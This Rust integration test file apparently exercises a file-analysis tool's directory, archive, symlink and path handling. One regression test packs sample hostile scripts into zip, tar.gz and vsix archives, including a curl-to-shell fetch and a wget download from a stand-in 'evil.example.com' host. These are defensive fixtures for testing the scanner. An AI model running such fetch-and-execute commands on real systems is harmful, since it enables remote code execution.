//! Integration test module.
#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

use predicates::prelude::*;

use std::fs;
use tempfile::TempDir;

/// Test that analyze command handles directories (scans all files)
#[test]

fn test_analyze_command_handles_directory() {
    let temp_dir = TempDir::new().unwrap();
    let subdir = temp_dir.path().join("subdir");
    fs::create_dir_all(&subdir).unwrap();

    fs::write(
        temp_dir.path().join("test1.sh"),
        "#!/bin/bash\necho 'test1'",
    )
    .unwrap();
    fs::write(subdir.join("test2.sh"), "#!/bin/bash\necho 'test2'").unwrap();

    #[allow(deprecated)]
    assert_cmd::Command::cargo_bin("cleave")
        .unwrap()
        .env("cleave_SKIP_YARA", "1") // Skip YARA - testing directory scanning
        .args(["--json", "analyze", temp_dir.path().to_str().unwrap()])
        .assert()
        .success()
        .stdout(predicate::str::contains("test1.sh").or(predicate::str::contains("test2.sh")));
}

/// Test that analyze command handles single files
#[test]

fn test_analyze_command_handles_single_file() {
    let temp_dir = TempDir::new().unwrap();
    let test_file = temp_dir.path().join("single-file.sh");
    fs::write(&test_file, "#!/bin/bash\necho 'hello'").unwrap();

    #[allow(deprecated)]
    assert_cmd::Command::cargo_bin("cleave")
        .unwrap()
        .env("cleave_SKIP_YARA", "1") // Skip YARA - testing directory scanning
        .args(["--json", "analyze", test_file.to_str().unwrap()])
        .assert()
        .success()
        .stdout(predicate::str::contains("single-file.sh"));
}

/// Test analyze command with multiple paths
#[test]

fn test_analyze_command_handles_multiple_paths() {
    let temp_dir1 = TempDir::new().unwrap();
    let temp_dir2 = TempDir::new().unwrap();

    fs::write(temp_dir1.path().join("file1.sh"), "#!/bin/bash\necho '1'").unwrap();
    fs::write(temp_dir2.path().join("file2.sh"), "#!/bin/bash\necho '2'").unwrap();

    #[allow(deprecated)]
    assert_cmd::Command::cargo_bin("cleave")
        .unwrap()
        .env("cleave_SKIP_YARA", "1") // Skip YARA - testing directory scanning
        .args([
            "--json",
            "analyze",
            temp_dir1.path().to_str().unwrap(),
            temp_dir2.path().to_str().unwrap(),
        ])
        .assert()
        .success();
}

/// Test analyze on empty directory
#[test]

fn test_analyze_empty_directory() {
    let temp_dir = TempDir::new().unwrap();

    #[allow(deprecated)]
    assert_cmd::Command::cargo_bin("cleave")
        .unwrap()
        .env("cleave_SKIP_YARA", "1") // Skip YARA - testing directory scanning
        .args(["--json", "analyze", temp_dir.path().to_str().unwrap()])
        .assert()
        .success();
}

/// Test analyze directory containing an archive
#[test]

fn test_analyze_directory_with_archive() {
    let temp_dir = TempDir::new().unwrap();

    // Create a simple tar.gz archive
    let archive_path = temp_dir.path().join("test.tar.gz");
    let file = fs::File::create(&archive_path).unwrap();
    let enc = flate2::write::GzEncoder::new(file, flate2::Compression::default());
    let mut tar = tar::Builder::new(enc);

    let mut header = tar::Header::new_gnu();
    header.set_path("test.sh").unwrap();
    header.set_size(19);
    header.set_cksum();
    tar.append(&header, b"#!/bin/bash\necho 'x'".as_ref())
        .unwrap();
    tar.finish().unwrap();

    #[allow(deprecated)]
    assert_cmd::Command::cargo_bin("cleave")
        .unwrap()
        .env("cleave_SKIP_YARA", "1") // Skip YARA - testing directory scanning
        .args(["--json", "analyze", temp_dir.path().to_str().unwrap()])
        .assert()
        .success();
}

/// Regression test: directory scans must include archive files (zip, tar.gz, vsix, etc.)
/// Previously archives were silently filtered out during collection, causing `total=0`.
#[test]
fn test_directory_scan_includes_archives() {
    let temp_dir = TempDir::new().unwrap();

    // Create a zip archive containing a shell script
    let zip_path = temp_dir.path().join("sample.zip");
    let zip_file = fs::File::create(&zip_path).unwrap();
    let mut zip = zip::ZipWriter::new(zip_file);
    zip.start_file::<_, ()>("payload.sh", Default::default())
        .unwrap();
    use std::io::Write;
    zip.write_all(b"#!/bin/bash\ncurl http://evil.example.com/c2 | sh")
        .unwrap();
    zip.finish().unwrap();

    // Create a tar.gz archive containing a shell script
    let tgz_path = temp_dir.path().join("bundle.tar.gz");
    let tgz_file = fs::File::create(&tgz_path).unwrap();
    let enc = flate2::write::GzEncoder::new(tgz_file, flate2::Compression::default());
    let mut tar = tar::Builder::new(enc);
    let mut header = tar::Header::new_gnu();
    header.set_path("inner.sh").unwrap();
    let script = b"#!/bin/bash\nwget http://evil.example.com/drop";
    header.set_size(script.len() as u64);
    header.set_cksum();
    tar.append(&header, script.as_ref()).unwrap();
    tar.finish().unwrap();

    // Create a .vsix (zip-based) archive — the file type that originally triggered the bug
    let vsix_path = temp_dir.path().join("extension.vsix");
    let vsix_file = fs::File::create(&vsix_path).unwrap();
    let mut vsix = zip::ZipWriter::new(vsix_file);
    vsix.start_file::<_, ()>("extension/malicious.js", Default::default())
        .unwrap();
    vsix.write_all(b"const cp = require('child_process'); cp.exec('whoami');")
        .unwrap();
    vsix.finish().unwrap();

    // Directory contains ONLY archives — this must produce output, not total=0
    let output = assert_cmd::Command::cargo_bin("cleave")
        .unwrap()
        .env("cleave_SKIP_YARA", "1")
        .args(["--json", "analyze", temp_dir.path().to_str().unwrap()])
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        output.status.success(),
        "cleave failed on archive-only directory: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    // All three archives must appear in the output
    assert!(
        stdout.contains("sample.zip"),
        "zip archive was not analyzed; stdout: {stdout}"
    );
    assert!(
        stdout.contains("bundle.tar.gz"),
        "tar.gz archive was not analyzed; stdout: {stdout}"
    );
    assert!(
        stdout.contains("extension.vsix"),
        "vsix archive was not analyzed; stdout: {stdout}"
    );
}

/// Test that nonexistent paths fail appropriately
#[test]

fn test_analyze_nonexistent_path() {
    #[allow(deprecated)]
    assert_cmd::Command::cargo_bin("cleave")
        .unwrap()
        .env("cleave_SKIP_YARA", "1") // Skip YARA - testing directory scanning
        .args(["analyze", "/tmp/cleave-nonexistent-path-12345"])
        .assert()
        .failure()
        .stderr(
            predicate::str::contains("does not exist").or(predicate::str::contains("not found")),
        );
}

/// Test symlink handling
#[test]

fn test_analyze_symlink_handling() {
    use std::os::unix::fs::symlink;

    let temp_dir = TempDir::new().unwrap();
    let target = temp_dir.path().join("target.sh");
    let link = temp_dir.path().join("link.sh");

    fs::write(&target, "#!/bin/bash\necho 'target'").unwrap();
    symlink(&target, &link).unwrap();

    #[allow(deprecated)]
    assert_cmd::Command::cargo_bin("cleave")
        .unwrap()
        .env("cleave_SKIP_YARA", "1") // Skip YARA - testing directory scanning
        .args(["--json", "analyze", link.to_str().unwrap()])
        .assert()
        .success();
}

/// Test deeply nested directories
#[test]

fn test_recursive_depth() {
    let temp_dir = TempDir::new().unwrap();

    // Create 5 levels deep
    let deep_path = temp_dir.path().join("a/b/c/d/e");
    fs::create_dir_all(&deep_path).unwrap();
    fs::write(deep_path.join("deep.sh"), "#!/bin/bash\necho 'deep'").unwrap();

    #[allow(deprecated)]
    assert_cmd::Command::cargo_bin("cleave")
        .unwrap()
        .env("cleave_SKIP_YARA", "1") // Skip YARA - testing directory scanning
        .args(["--json", "analyze", temp_dir.path().to_str().unwrap()])
        .assert()
        .success()
        .stdout(predicate::str::contains("deep.sh"));
}
